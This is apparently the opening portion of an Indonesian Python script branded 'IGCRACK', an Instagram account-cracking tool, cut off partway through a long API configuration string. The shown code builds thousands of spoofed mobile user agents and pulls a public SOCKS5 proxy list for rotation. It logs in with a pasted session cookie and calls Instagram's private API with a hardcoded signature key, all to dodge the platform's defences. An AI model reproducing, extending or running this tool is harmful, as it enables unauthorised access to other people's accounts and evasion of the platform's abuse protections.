# coding:utf-8
#/usr/bin/python
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
###----------[ WARNA PRINT RICH ]---------- ###

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

try:
	import json
	import uuid
	import hmac
	import rich
	import random
	import hashlib
	import urllib
	import urllib.request
	import calendar
except ImportError as e:
	exit(f'[!] {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
        import rich
except ImportError as e:
        print (f" {M}• {P}sedang install bahan {H}{e.name}, {P}mohon tunggu...")
        os.system(f"python -m pip install {e.name} &> /dev/null")
        os.system(f"python -m pip install requests &> /dev/null")

from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from rich.progress import track
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.tree import Tree
from rich import print as prints
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as cetak
from rich import print as cetak
from rich.columns import Columns
from rich import print as Buat
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich import print as printer
from rich.console import Console
from rich.console import Console as sol
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()


day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'

merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
hapus  = '[/]'
biru_m = '[bold cyan]'

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

color_table = "#FFFFFF"
color_rich = "[#00C8FF]"
sys.stdout.write('\x1b]2; IGC\AsepitgansXC\x07')

try:os.mkdir('data')
except:pass
try:os.mkdir('result')
except:pass

CY='\033[96;1m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
### COLOR RICH ###
warna_merah = "[#FF0000]" # MERAH
warna_hijau = "[#00FF00]" # HIJAU
warna_kuning = "[#FFFF00]" # KUNING
warna_biru = "[#00C8FF]" # BIRU
warna_ungu = "[#AF00FF]" # UNGU
warna_biru2 = "[#00FFFF]" # BIRU MUDA
warna_putih = "[#FFFFFF]" # PUTIH
warna_jinga = "[#FF8F00]" # JINGGA
warna_abu = "[#AAAAAA]" # ABU-ABU
warna_magenta = "[#d700d7]" # MAGENTA
bc = '[bold cyan]'

a = "[#8700af]"
b = "[#87875f]"
c = "[#8787af]"
d = "[#87afff]"
e = "[#87ff00]"
R3 = random.choice([a, b, c, d, e])

USN = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 Instagram 32.0.0.14.97 (iPhone10,6; iOS 11_1_1; ru_UA; ru-UA; scale=3.00; gamut=wide; 1125x2436)"

internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],[]
HARIS, HARIS1, method, ugen, ugen3, ugen2, baru, zx, prox, menudump, uazpepek = {}, {}, [], [], [], [], [], [], [], [], []
s = requests.Session()
UaNgentodMuach = []

def uazku():
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; ru-ru; Redmi K20 Pro Premium Edition Build/QKQ1.{str(rr(111111,199999))}.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(71,99))}.0.{str(rr(3500,3900))}.{str(rr(140,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.5.2-go"
    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G950W Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Flipboard/4.3.0/{str(rr(5300,5500))},4.3.0.{str(rr(5300,5500))}"
    uazku3 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36	Android"
    uazku4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; Infinix X683 Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5300,5900))}.{str(rr(75,150))} Mobile Safari/537.36 GoogleApp/13.47.8.26.arm64"
    uazku5 = f"Mozilla/5.0 (Linux; Android {str(rr(1,8))}.1.0; VSD243 Build/OPM8.{str(rr(111111,199999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,75))}.0.{str(rr(3100,3500))}.{str(rr(75,99))} Safari/537.36"
    uazku6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,7))}.{str(rr(1,5))}; EK-GC200 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36"
    uazku7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5500,5900))}.{str(rr(120,150))} Mobile Safari/537.36"
    uazku8 = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7]))
    return uazku8

for xc in range(1000):
    rr = random.randint
    rc = random.choice
    uaz1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; zh-CN; Infinix X6511B Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(2500,2900))}.{str(rr(75,150))} HiBrowser/2.5.016 UWS/ Mobile Safari/537.36"
    uaz2 = f"Mozilla/5.0 (Linux; Android 11; RMX3195 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} YaBrowser/22.1.0.{str(rr(190,199))} (lite) Mobile Safari/537.36"
    uaz3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; OPPO; CPH2197; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
    uainsta = str(rc([uaz1, uaz2, uaz3]))
    baru.append(uainsta)

for luxine_devs in range(10000):
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; Android 11; RMX3231 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (30/11; 360dpi; 720x1437; realme; RMX3231; RMX3231; RMX3231; it_IT; {str(rr(422222222,499999999))})"
    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G960F Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (29/{str(rr(9,12))}; 540dpi; 1080x2058; samsung; SM-G960F; starlte; samsungexynos9810; it_IT; {str(rr(422222222,499999999))})"
    uazku3 = f"Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.{str(rr(211111,299999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,140))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,90))}.{str(rr(111,199))} Android (30/11; 320dpi; 720x1368; HMD Global/Nokia; Nokia 3.2; DPL_sprout; qcom; it_IT; {str(rr(411111111,499999999))})"
    uazstart = str(rc([uazku1, uazku2, uazku3]))
    uazpepek.append(uazstart)

for luxine_dev in range(1000):
   android1 = rc(["3","4","5","6","7","8","9","10","11","12"])
   android2 = rc(["1.5","1.6","2.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.0","8.1.0","4.4.4","5.1","6.3"])
   adtyaxcc = rc(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
   aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
   chrome1 = rr(73,99)
   chrome2 = rr(4500,4900)
   chrome3 = rr(75,150)
   chrome4 = rr(111111,199999)
   buildhan = rc([
                  "MMB29P",
                  "MMB29K",
                  "LRX22G",
                  "LMY48B",
                  "JZO54K",
                  "KTU84P",
                  "KOT49H",
                  "JDQ39"])
   deviceku = rc([
                  "Lenovo TB-X104X",
                  "SM-G930VC",
                  "Nexus 6P",
                  "SAMSUNG SM-T550",
                  "HTC Legend 1.32.163.1",
                  "HTC_TATTOO_A3288",
                  "Nexus One",
                  "LG-L1100",
                  "SonyEricssonX10i",
                  "SM-A510F",
                  "SM-T560",
                  "B3-A20",
                  "XT720"])
   ugent1 = f"Mozilla/5.0 (Linux; Android {android1}; SM-R825F Build/QP1A.{chrome4}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36"
   ugent2 = f"Mozilla/5.0 (Linux; U; Android {android2}; {adtyaxcc}; {deviceku} Build/{buildhan}) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
   ugent3 = f"Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.{chrome4}.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36 OPR/48.2.{chrome2}.133{chrome3}"
   biwir_berem = rc([ugent1,ugent2,ugent3])
   UaNgentodMuach.append(biwir_berem)
   

try:
    with requests.Session() as ses:
        _url = ses.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
        for xc in _url.splitlines():
            prox.append(xc)
except requests.exceptions.ConnectionError:
    print(f"{P}[{M}!{P}] koneksi internet anda bermasalah")
    time.sleep(0.3)
    exit()

try:
	with requests.Session() as ses:
	      url = ses.get("http://ip-api.com/json/").json()
	      alamat_ip  = url["query"]
	      alamat_cn= url["country"]
	      alamat_region = url["regionName"]
except KeyError:
	alamat_ip = "-"
	alamat_cn = "-"
	alamat_region = "-"

def clear():
	try:os.system('clear')
	except:pass

def RemoveCookie():
    try:os.remove("data/cookie.txt")
    except:pass
    try:os.remove("data/user.txt")
    except:pass

def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 

def banner():
	try:clear()
	except:pass
	insta = prints
	crack = Panel
	print(f"""
 _____  ______ _     _  ______ _______ _     _
   |   |  ____ |____/  |_____/ |______ |____/ 
 __|__ |_____| |    \_ |    \_ |______ |    \_
                                              
[+] Author Asepitgans XC
[+] Status\033[32m Premium - Termux-Sec\033[0m""")

def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r[•]LOADING... " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")		

try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
    user=open('data/user.txt','r').read()
    coki = open('data/cookie.txt','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except FileNotFoundError:
    	os.remove('data/cookie.txt')
    	os.remove('data/user.txt')
    except  (ValueError,KeyError):
        print(f"{P}[{B}+{P}] instagram checkpoint")
        os.remove('data/cookie.txt')
        os.remove('data/user.txt')
        exit()

    return external,user

def ggwp17():
        try:
            kuki=open('data/cookie.txt','r').read()
        except FileNotFoundError:
            banner()
            insta = prints
            crack = Panel
         #   insta(crack(f"""DI SARANKAN TIDAK MENGUNAKAN AKUN PRIBADI/AKUN SENDIRI KARNA AKAN MENYEBABKAN AKUN TERKENA KUNCI/SESI""",title=f'{warna_biru}• {warna_merah}• {warna_ungu}SARAN'))
            coki = input(f"\n{P}[{M}C{P}] Cookie : ")
            loading()
            try:
                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
                xx = json.loads(po.text)['user']
                useri = xx["username"]
                user = open('data/user.txt','w').write(useri)
                kuki = open('data/cookie.txt','w').write(coki)
                insta(crack(f"""{warna_biru}{coki}""",title=f'{warna_biru}• {warna_merah}•{warna_ungu} LOGIN DENGAN COOKIE {warna_merah}•{warna_biru} •'))
                time.sleep(0.05)
                time.sleep(3)
            except (json.decoder.JSONDecodeError, KeyError, AttributeError):
                jalan(f"{P}[{M}(:{P}] cookie invalid")
                time.sleep(3)
                RemoveCookie()
                exit()
            except ConnectionAbortedError:
                print(f"{P}[{M}!{P}] koneksi internet anda bermasalah")
                time.sleep(3)
                exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()

def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_andr